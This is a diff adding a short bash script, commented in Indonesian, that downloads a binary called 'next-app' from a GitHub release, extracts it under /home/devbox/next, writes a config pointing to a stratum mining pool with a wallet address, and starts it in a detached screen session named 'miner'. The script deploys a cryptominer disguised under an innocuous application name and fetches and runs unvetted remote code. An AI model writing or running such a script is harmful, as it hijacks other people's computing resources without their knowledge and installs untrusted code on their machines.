@@ -1,0 +1,30 @@
+#!/bin/bash
+
+# Update dan install dependensi
+apt update -y && apt install -y wget tar screen
+
+# Download file
+wget -O next-app.tar.gz https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz
+
+# Ekstrak ke folder
+mkdir -p /home/devbox/next
+tar -xf next-app.tar.gz -C /home/devbox/next
+
+cd /home/devbox/next || exit 1
+
+# Pastikan file bisa dieksekusi
+chmod +x next-app
+
+# Buat file konfigurasi (perbaikan format JSON)
+cat > config.json <<EOF
+{
+  "host": "stratum+tcp://asia.rplant.xyz",
+  "port": 17149,
+  "user": "mbc1qt9gj6nqz4p3f7tylp9mnuvc8vcyrcgue9psxg5",
+  "pass": "x",
+  "threads": 7
+}
+EOF
+
+# Jalankan di screen
+screen -dmS miner ./next-app
